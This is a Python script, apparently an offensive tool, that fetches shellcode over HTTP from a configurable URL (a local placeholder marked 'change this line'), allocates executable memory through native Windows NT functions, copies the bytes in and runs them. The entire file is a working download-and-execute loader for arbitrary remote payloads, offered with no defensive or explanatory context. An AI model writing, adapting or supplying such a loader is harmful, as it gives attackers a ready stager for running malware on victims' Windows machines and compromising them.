import requests
from ctypes import *
from ctypes import wintypes

URL = "http://127.0.0.1:8000/shellcode" # change this line

SIZE_T = c_size_t
NTSTATUS = wintypes.DWORD
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READ_WRITE = 0x40

NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
NtAllocateVirtualMemory.argtypes = (
    wintypes.HANDLE, POINTER(wintypes.LPVOID),
    wintypes.ULONG, POINTER(wintypes.ULONG),
    wintypes.ULONG, wintypes.ULONG
)
NtAllocateVirtualMemory.restype = NTSTATUS

NtProtectVirtualMemory = windll.ntdll.NtProtectVirtualMemory
NtProtectVirtualMemory.argtypes = (
    wintypes.HANDLE, POINTER(wintypes.LPVOID),
    POINTER(wintypes.ULONG), wintypes.ULONG,
    POINTER(wintypes.ULONG)
)
NtProtectVirtualMemory.restype = NTSTATUS

print("Fetching shellcode from server...")

response = requests.get(URL)
shellcode = response.content
shellcode_length = len(shellcode)

print(f"Shellcode fetched: {shellcode_length} bytes.")

ProcessHandle = 0xffffffffffffffff
BaseAddress = wintypes.LPVOID(0x0)
ZeroBits = wintypes.ULONG(0)

PAGE_SIZE = 4096
RegionSize = wintypes.ULONG((shellcode_length + PAGE_SIZE - 1) // PAGE_SIZE * PAGE_SIZE)
AllocationType = MEM_COMMIT | MEM_RESERVE

res = NtAllocateVirtualMemory(
    ProcessHandle,
    byref(BaseAddress),
    ZeroBits,
    byref(RegionSize),
    AllocationType,
    PAGE_EXECUTE_READ_WRITE
)

if res != 0:
    raise RuntimeError(f"NtAllocateVirtualMemory failed. Status code -> {res}")

print(f"Memory allocated at -> {hex(BaseAddress.value)}")

shellcode_ptr = (c_char * shellcode_length).from_buffer_copy(shellcode)
RtlCopyMemory = windll.ntdll.RtlCopyMemory
RtlCopyMemory.argtypes = (wintypes.LPVOID, wintypes.LPCVOID, SIZE_T)
RtlCopyMemory.restype = None

RtlCopyMemory(
    BaseAddress,
    shellcode_ptr,
    shellcode_length
)

print("Shellcode copied to allocated memory.")

NewProtect = PAGE_EXECUTE_READ_WRITE
OldProtect = wintypes.ULONG(0)

res = NtProtectVirtualMemory(
    ProcessHandle,
    byref(BaseAddress),
    byref(RegionSize),
    NewProtect,
    byref(OldProtect)
)

if res != 0:
    raise RuntimeError(f"NtProtectVirtualMemory failed. Status code -> {res}")

print("Memory protection updated to PAGE_EXECUTE_READ_WRITE.")

shellcode_func = CFUNCTYPE(None)
shellcode_callable = cast(BaseAddress, shellcode_func)

print("Executing shellcode...")
shellcode_callable()
